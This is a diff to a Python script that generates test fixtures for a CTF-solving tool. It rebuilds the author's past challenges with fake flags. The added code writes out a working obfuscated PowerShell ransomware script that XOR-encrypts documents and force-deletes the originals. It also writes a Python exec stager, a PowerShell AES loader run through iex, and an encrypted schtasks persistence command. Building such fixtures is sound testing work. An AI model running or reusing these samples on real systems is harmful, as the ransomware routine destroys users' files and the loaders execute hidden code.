@@ -701,6 +701,131 @@ def write_keyhunt_fixtures() -> None:
     )
 
 
+# ---------------------------------------------------------------------------
+# M8: shapes of the user's own past challenges (github.com/CreaTikaa/CTFs-Writeups),
+# rebuilt with new keys and fake flags. The real flags are never copied here.
+# ---------------------------------------------------------------------------
+
+
+def random_text_key(length: int) -> str:
+    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+    return "".join(RNG.choice(alphabet) for _ in range(length))
+
+
+def write_writeup_fixtures() -> None:
+    # 1. "Cave Expedition" shape: a PowerShell ransomware rebuilt from event logs.
+    #    Obfuscated names, two base64 keys decoded by a helper function, the file
+    #    XORed with BOTH keys (64 and 24 bytes: one 192-byte keystream, too long to
+    #    find statistically), then written as base64 text. The file is not in the
+    #    script: only `ctfc lens --against` can solve it.
+    key1, key2 = random_text_key(64), random_text_key(24)
+    script = f"""$k34Vm = "{base64.b64encode(b"*.txt *.doc *.docx *.pdf").decode()}"
+$a53Va = "{base64.b64encode(key1.encode()).decode()}"
+$b64Vb = "{base64.b64encode(key2.encode()).decode()}"
+
+function a12Vc {{
+    param([string]$a34Vd)
+    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd))
+}}
+
+$c56Ve = a12Vc $a53Va
+$d78Vf = a12Vc $b64Vb
+
+function l34Vn {{
+    param([byte[]]$m56Vo, [byte[]]$n78Vp, [byte[]]$o90Vq)
+    $p12Vr = [byte[]]::new($m56Vo.Length)
+    for ($x = 0; $x -lt $m56Vo.Length; $x++) {{
+        $q34Vs = $n78Vp[$x % $n78Vp.Length]
+        $r56Vt = $o90Vq[$x % $o90Vq.Length]
+        $p12Vr[$x] = $m56Vo[$x] -bxor $q34Vs -bxor $r56Vt
+    }}
+    return $p12Vr
+}}
+
+function s78Vu {{
+    param([byte[]]$t90Vv, [string]$u12Vw, [string]$v34Vx)
+    $y90Va = [System.Text.Encoding]::UTF8.GetBytes($u12Vw)
+    $z12Vb = [System.Text.Encoding]::UTF8.GetBytes($v34Vx)
+    $a34Vc = l34Vn $t90Vv $y90Va $z12Vb
+    return [Convert]::ToBase64String($a34Vc)
+}}
+
+foreach ($ext in (a12Vc $k34Vm).Split(" ")) {{
+    Get-ChildItem -Path "dca01aq2/" -Recurse | Where-Object {{ $_.Extension -match "^\\.$ext$" }} |
+        ForEach-Object {{
+            $s90Vu = [IO.File]::ReadAllBytes($_.FullName)
+            $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf
+            [IO.File]::WriteAllText("$($_.FullName).secured", $t12Vv)
+            Remove-Item $_.FullName -Force
+        }}
+}}
+"""
+    write("writeup_cave_ransom.ps1", script)
+    pdf = (
+        b"%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
+        b"2 0 obj << /Type /Pages /Count 1 >> endobj\n"
+        b"BT /F1 24 Tf (Treasure map: CYBN{fixture_two_xor_keys}) Tj ET\n%%EOF\n"
+    )
+    stream = bytes(b ^ ord(key1[i % 64]) ^ ord(key2[i % 24]) for i, b in enumerate(pdf))
+    write("writeup_cave_map.pdf.secured", base64.b64encode(stream))
+
+    # 2. "A new Hire" shape: a Python stager, base64 key, XORed + zlib payload, exec.
+    key = b"CYBN{fixture_stager_key}"
+    payload = b"print('stage two loaded')  # CYBN{fixture_new_hire}\n"
+    blob = base64.b64encode(xor(zlib.compress(payload), key)).decode()
+    client = (
+        "import base64\n"
+        "import zlib\n\n"
+        f'key = base64.b64decode("{base64.b64encode(key).decode()}")\n\n'
+        f'data = base64.b64decode("{blob}")\n'
+        "meterpreter_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])\n\n"
+        "exec(zlib.decompress(meterpreter_data))\n"
+    )
+    write("writeup_newhire_client.py", client)
+
+    # 3. "Ghost in the Dark" shape: a PowerShell AES loader; the encrypted file is
+    #    separate (recovered from a disk image with tsk_recover / fls).
+    aes_key, aes_iv = RNG.randbytes(32), RNG.randbytes(16)
+    loader = f"""$k = [Convert]::FromBase64String("{base64.b64encode(aes_key).decode()}")
+$v = [Convert]::FromBase64String("{base64.b64encode(aes_iv).decode()}")
+$aes = [System.Security.Cryptography.Aes]::Create()
+$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$aes.Key = $k
+$aes.IV = $v
+$bytes = [IO.File]::ReadAllBytes("payload.enc")
+$dec = $aes.CreateDecryptor().TransformFinalBlock($bytes, 0, $bytes.Length)
+iex ([Text.Encoding]::UTF8.GetString($dec))
+"""
+    write("writeup_ghost_loader.ps1", loader)
+    stage2 = b"Write-Host 'ransom note dropped'  # CYBN{fixture_ghost_loader}\n"
+    write(
+        "writeup_ghost_payload.enc", AES.new(aes_key, AES.MODE_CBC, aes_iv).encrypt(pad(stage2, 16))
+    )
+
+    # 4. "Silent Trap" shape: C2 commands in mails, RC4 then base64.
+    rc4_key = RNG.randbytes(16)
+    command = b"schtasks /create /tn Synchronization /tr calc.exe  & echo CYBN{fixture_rc4_mail}"
+    write("writeup_silent_rc4.b64", base64.b64encode(rc4(rc4_key, command)) + b"\n")
+    write("writeup_silent_rc4.key", rc4_key.hex() + "\n")
+
+
+def rc4(key: bytes, data: bytes) -> bytes:
+    """RC4, written here so the fixture does not depend on ctfc or pycryptodome."""
+    state = list(range(256))
+    j = 0
+    for i in range(256):
+        j = (j + state[i] + key[i % len(key)]) % 256
+        state[i], state[j] = state[j], state[i]
+    i = j = 0
+    out = bytearray()
+    for byte in data:
+        i = (i + 1) % 256
+        j = (j + state[i]) % 256
+        state[i], state[j] = state[j], state[i]
+        out.append(byte ^ state[(state[i] + state[j]) % 256])
+    return bytes(out)
+
+
 def main() -> None:
     FIXTURES.mkdir(exist_ok=True)
     print(f"writing fixtures to {FIXTURES}")
@@ -870,6 +995,9 @@ def main() -> None:
     # order of the earlier fixtures must not change) ---
     write_classical_fixtures()
     write_keyhunt_fixtures()
+
+    # --- M8: shapes of the user's past challenges ---
+    write_writeup_fixtures()
 
 
 if __name__ == "__main__":
